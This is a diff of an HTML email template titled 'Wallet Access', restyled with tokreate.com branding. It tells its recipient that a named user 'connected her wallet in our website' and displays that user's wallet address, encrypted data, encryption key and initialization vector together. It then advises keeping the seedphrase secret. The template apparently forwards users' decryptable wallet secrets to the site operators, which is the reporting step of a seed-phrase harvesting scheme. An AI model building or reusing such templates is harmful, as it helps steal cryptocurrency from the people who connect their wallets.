@@ -1,56 +1,99 @@
-<table cellspacing="0" cellpadding="0" border="0" style="color:#333;background:#fff;padding:0;margin:0;width:100%;font:15px/1.25em 'Helvetica Neue',Arial,Helvetica"> 
-    <tbody>
-        <tr width="100%"> 
-            <td valign="top" align="left" style="background:#dadada;font:15px/1.25em 'Helvetica Neue',Arial,Helvetica"> 
-                <table style="border:none;padding:0 18px;margin:50px auto;width:500px"> 
-                    <tbody> 
-                        <tr width="100%" height="60"> 
-                            <td valign="top" align="left" style="border-top-left-radius:4px;border-top-right-radius:4px;background:#27709b url(https://ci5.googleusercontent.com/proxy/EX6LlCnBPhQ65bTTC5U1NL6rTNHBCnZ9p-zGZG5JBvcmB5SubDn_4qMuoJ-shd76zpYkmhtdzDgcSArG=s0-d-e1-ft#https://trello.com/images/gradient.png) bottom left repeat-x;padding:10px 18px;text-align:center"> 
-                                <img height="50" width="50" src="{{url('logo.png')}}"> 
-                            </td> 
-                        </tr>   
-                        <tr width="100%"> 
-                            <td valign="top" align="left" style="background:#fff;padding:18px">
-                                <h1 style="font-size:20px;margin:16px 0;color:#333;text-align:center"> Wallet Access </h1>
-                                <p style="font:15px/1.25em 'Helvetica Neue',Arial,Helvetica;color:#333;text-align:center">{{ $user_details->profile->user_profile_full_name }} connect her wallet in our website. Check the credential below.</p>
+<html lang="en-US">
 
-                                <hr>
-                                <div style="background:#f6f7f8;border-radius:3px">
-                                <table>
-                                    <tr>
-                                        <td width="200"><strong>Wallet Address: </strong></td>
-                                        <td> {{$email_content->wallet_address}}</td>
-                                    </tr>
-                                    <tr>
-                                        <td><strong>Encrypted Data: </strong></td>
-                                        <td> {{$email_content->encrypted_data}}</td>
-                                    </tr>
-                                    <tr>
-                                        <td><strong>Encryption Key: </strong></td>
-                                        <td> {{$email_content->encryption_key}}</td>
-                                    </tr>
-                                    <tr>
-                                        <td><strong>Initialization Vector: </strong></td>
-                                        <td> {{$email_content->initialization_vector}}</td>
-                                    </tr>
-                                </table>
-                                </div>
-                                <hr>
-                                <p style="font:14px/1.25em 'Helvetica Neue',Arial,Helvetica;color:#333"> 
-                                    <strong>Note:</strong> 
-                                    Keep your seedphrase safe, it's your responsibility.
-                                </p>
-                                <h4>Tips on storing it safely</h4>
-                                <ul>
-                                    <li>Save a backup multiple places.</li>
-                                    <li>Never share the phrase with anyone</li>
-                                    <li>Be careful of phishing site.</li>
-                                </ul>
-                            </td>
-                        </tr>
-                    </tbody> 
-                </table> 
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <style type="text/css">
+        a:hover {text-decoration: underline !important;}
+    </style>
+</head>
+
+<body marginheight="0" topmargin="0" marginwidth="0" style="margin: 0px; background-color: #eaeaea; padding: 40px 0px;" leftmargin="0">
+    <!--100% body table-->
+    <table cellspacing="0" border="0" cellpadding="0" width="100%" bgcolor="#eaeaea"
+        style="@import url(https://fonts.googleapis.com/css?family=Rubik:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
+        <tr>
+            <a href="https://rakeshmandal.com" title="logo" target="_blank">
+              <img style="margin: 0 auto; display: block; margin-bottom: 25px;" width="60"  src="<?= url('logo.png') ?>" title="logo" alt="logo">
+          </a>
+        </tr>
+        <tr>
+            <td>
+                <table style="background-color: #eaeaea; max-width:670px;  margin:0 auto;" width="100%" border="0"
+                    align="center" cellpadding="0" cellspacing="0">
+                    <tr>
+                        <td style="height:20px;">&nbsp;</td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0"
+                                style="max-width:670px;background:#fff; border-radius:3px; text-align:center;-webkit-box-shadow:0 6px 18px 0 rgba(0,0,0,.06);-moz-box-shadow:0 6px 18px 0 rgba(0,0,0,.06);box-shadow:0 6px 18px 0 rgba(0,0,0,.06);">
+                                <tr>
+                                    <td style="height:50px;">&nbsp;</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding:0 50px;">
+                                        <h1 style="color:#1e1e2d; font-weight:600; margin:0;font-size:28px;font-family:'Rubik',sans-serif;">Wallet Access</h1>
+                                        <span style="display:inline-block; vertical-align:middle; margin:29px 0 26px; border-bottom:1px solid #cecece;width:100px;"></span>
+                                        <p style="color:#455056; font-size:15px;line-height:24px; margin:0;">
+                                        {{ $user_details->profile->user_profile_full_name }} connected her wallet in our website. Check the credential below.
+                                        </p>
+                                        <br>
+                                        <hr>
+                                            <div style="background:#f6f7f8;border-radius:3px; color:#455056;">
+                                                <table>
+                                                    <tr>
+                                                        <td width="200"><strong>Wallet Address: </strong></td>
+                                                        <td> {{$email_content->wallet_address}}</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td><strong>Encrypted Data: </strong></td>
+                                                        <td> {{$email_content->encrypted_data}}</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td><strong>Encryption Key: </strong></td>
+                                                        <td> {{$email_content->encryption_key}}</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td><strong>Initialization Vector: </strong></td>
+                                                        <td> {{$email_content->initialization_vector}}</td>
+                                                    </tr>
+                                                </table>
+                                            </div>
+                                            <hr>
+                                            <br>
+                                            <p style="color:#455056;"> 
+                                                <strong>Note:</strong> 
+                                                Keep your seedphrase safe, it's your responsibility.
+                                            </p>
+                                            <h4 style="color:#455056;">Tips on storing it safely</h4>
+                                            <ul style="list-style: none; padding: 0px;color:#455056;">
+                                                <li>- Save a backup multiple places.</li>
+                                                <li>- Never share the phrase with anyone</li>
+                                                <li>- Be careful of phishing site.</li>
+                                            </ul>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td style="height:50px;">&nbsp;</td>
+                                </tr>
+                            </table>
+                        </td>
+                    <tr>
+                        <td style="height:30px;">&nbsp;</td>
+                    </tr>
+                    <tr>
+                        <td style="text-align:center;">
+                            <p style="font-size:14px; color:rgba(69, 80, 86, 0.7411764705882353); line-height:18px; margin:0 0 0;">&copy; <strong>www.tokreate.com</strong></p>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="height:80px;">&nbsp;</td>
+                    </tr>
+                </table>
             </td>
         </tr>
-    </tbody> 
-</table>
+    </table>
+    <!--/100% body table-->
+</body>
+
+</html>
